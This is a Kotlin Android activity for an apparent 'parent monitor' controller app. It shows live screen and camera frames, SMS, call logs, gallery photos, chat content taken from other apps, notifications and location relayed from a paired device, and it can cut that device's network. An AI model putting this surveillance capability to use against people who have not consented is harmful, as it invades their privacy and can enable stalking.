package com.parent.monitor

import android.content.Context
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.viewpager2.widget.ViewPager2
import com.google.android.material.tabs.TabLayout
import com.google.android.material.tabs.TabLayoutMediator
import org.json.JSONObject

class MainActivity : AppCompatActivity() {

    var wsManager: WebSocketManager? = null
    lateinit var adapter: ViewPagerAdapter
    private lateinit var statusDot: View
    private lateinit var tvStatus: TextView
    private lateinit var tvBattery: TextView
    private lateinit var tvPing: TextView
    private val handler = Handler(Looper.getMainLooper())
    private var wifiOn = true

    companion object {
        const val PREFS_NAME    = "config"
        const val KEY_SERVER_URL = "server_url"
        const val KEY_PAIR_CODE  = "pair_code"
        const val DEFAULT_URL   = "wss://your-app.replit.app/api/ws"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        statusDot = findViewById(R.id.statusDot)
        tvStatus  = findViewById(R.id.tvStatus)
        tvBattery = findViewById(R.id.tvBattery)
        tvPing    = findViewById(R.id.tvPing)

        setupViewPager()
        connectWebSocket()
        startPingTicker()

        findViewById<Button>(R.id.btnNetToggle).setOnClickListener {
            if (wifiOn) {
                wsManager?.sendCommand("wifi_off")
                (it as Button).text = "NET OFF"
                it.backgroundTintList = android.content.res.ColorStateList.valueOf(0xFFFF4444.toInt())
                it.setTextColor(0xFFFFFFFF.toInt())
            } else {
                wsManager?.sendCommand("wifi_on")
                (it as Button).text = "NET ON"
                it.backgroundTintList = android.content.res.ColorStateList.valueOf(0xFF00D4FF.toInt())
                it.setTextColor(0xFF000000.toInt())
            }
            wifiOn = !wifiOn
        }
    }

    private fun setupViewPager() {
        adapter = ViewPagerAdapter(this)
        val vp = findViewById<ViewPager2>(R.id.viewPager)
        vp.adapter = adapter
        vp.offscreenPageLimit = 5
        val tabs = listOf("📊 Dash", "📹 Live", "📂 Data", "🎮 Control", "🔔 Notifs", "⚙️ Settings")
        TabLayoutMediator(
            findViewById(R.id.tabLayout), vp
        ) { tab, pos -> tab.text = tabs[pos] }.attach()
    }

    fun connectWebSocket() {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val url      = prefs.getString(KEY_SERVER_URL, DEFAULT_URL)!!
        val pairCode = prefs.getString(KEY_PAIR_CODE, "")!!

        wsManager?.disconnect()
        wsManager = WebSocketManager(
            serverUrl    = url,
            pairCode     = pairCode,
            onConnected  = { runOnUiThread { setServerOnline() } },
            onDisconnected = { runOnUiThread { setServerOffline() } },
            onMessage    = { data -> runOnUiThread { handleMessage(data) } }
        )
        wsManager?.connect()
    }

    private fun handleMessage(data: JSONObject) {
        when (data.optString("type")) {
            "status" -> {
                if (data.optBoolean("child_online")) adapter.dashboardFragment.setChildOnline()
                else adapter.dashboardFragment.setChildOffline()
            }
            "battery" -> {
                val lvl = data.optInt("battery", -1)
                if (lvl >= 0) {
                    tvBattery.text = "🔋 $lvl%"
                    adapter.dashboardFragment.updateBattery(lvl)
                }
            }
            "location" -> {
                val lat = data.optDouble("lat"); val lng = data.optDouble("lng")
                adapter.dashboardFragment.updateLocation(lat, lng)
            }
            "current_app" -> {
                val pkg = data.optString("package")
                adapter.dashboardFragment.updateCurrentApp(pkg)
            }
            "screen_frame" -> {
                adapter.dashboardFragment.setChildOnline()
                adapter.liveFragment.onScreenFrame(data.optString("frame"))
            }
            "camera_frame" -> {
                adapter.dashboardFragment.setChildOnline()
                adapter.liveFragment.onCameraFrame(data.optString("frame"))
            }
            "photo" -> adapter.liveFragment.onCameraFrame(data.optString("image"))
            "gallery" -> adapter.dataFragment.onGallery(data.optJSONArray("photos") ?: return)
            "call_log" -> {
                adapter.dataFragment.onList("Calls", data.optJSONArray("calls") ?: return) { c ->
                    val t = c.optString("type")[0].uppercaseChar()
                    val dur = c.optLong("duration")
                    "[$t] ${c.optString("number")}  ${c.optString("name")}  ${dur}s"
                }
            }
            "sms" -> {
                adapter.dataFragment.onList("SMS", data.optJSONArray("messages") ?: return) { m ->
                    val t = if (m.optString("type") == "inbox") "📥" else "📤"
                    "$t ${m.optString("from")}  ${m.optString("body").take(60)}"
                }
            }
            "app_usage" -> {
                adapter.dataFragment.onList("Apps", data.optJSONArray("stats") ?: return) { s ->
                    val mins = s.optLong("totalTime") / 60000
                    "${s.optString("package").substringAfterLast('.')}  — ${mins}min"
                }
            }
            "app_open" -> {
                val pkg = data.optString("package")
                adapter.dashboardFragment.updateCurrentApp(pkg)
                adapter.dashboardFragment.setChildOnline()
            }
            "chat_content" -> {
                val pkg = data.optString("package").substringAfterLast('.')
                val content = data.optString("content").take(200)
                val item = NotificationItem(app = pkg, title = "Chat", text = content,
                    time = java.text.SimpleDateFormat("HH:mm", java.util.Locale.getDefault())
                        .format(java.util.Date()))
                adapter.notifFragment.adapter.addNotification(item)
            }
            "notification" -> {
                val item = NotificationItem(
                    app   = data.optString("app", "?"),
                    title = data.optString("title"),
                    text  = data.optString("text"),
                    time  = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault())
                        .format(java.util.Date()))
                adapter.notifFragment.adapter.addNotification(item)
                vibrate()
            }
            "permissions_result" -> {
                val count = data.optInt("granted")
                val shizuku = data.optBoolean("shizuku_available")
                tvStatus.text = if (shizuku) "🔑 $count perms granted (Shizuku)" else "⚠️ Shizuku unavailable"
            }
        }
    }

    private fun setServerOnline() {
        statusDot.setBackgroundResource(R.drawable.circle_green)
        tvStatus.text = "🟢 Server OK"
        tvStatus.setTextColor(0xFF4CAF50.toInt())
    }

    private fun setServerOffline() {
        statusDot.setBackgroundResource(R.drawable.circle_red)
        tvStatus.text = "🔴 Offline"
        tvStatus.setTextColor(0xFFF44336.toInt())
        tvPing.text = "📶 --ms"
        adapter.dashboardFragment.setChildOffline()
    }

    private fun startPingTicker() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                wsManager?.let { ws ->
                    if (ws.isConnected()) {
                        tvPing.text = "📶 ${ws.pingMs}ms"
                        adapter.dashboardFragment.updatePing(ws.pingMs)
                    }
                }
                handler.postDelayed(this, 2000)
            }
        }, 2000)
    }

    private fun vibrate() {
        try {
            val v = getSystemService(android.os.Vibrator::class.java)
            v?.vibrate(android.os.VibrationEffect.createOneShot(100,
                android.os.VibrationEffect.DEFAULT_AMPLITUDE))
        } catch (_: Exception) {}
    }

    override fun onDestroy() {
        super.onDestroy()
        wsManager?.disconnect()
        handler.removeCallbacksAndMessages(null)
    }
}
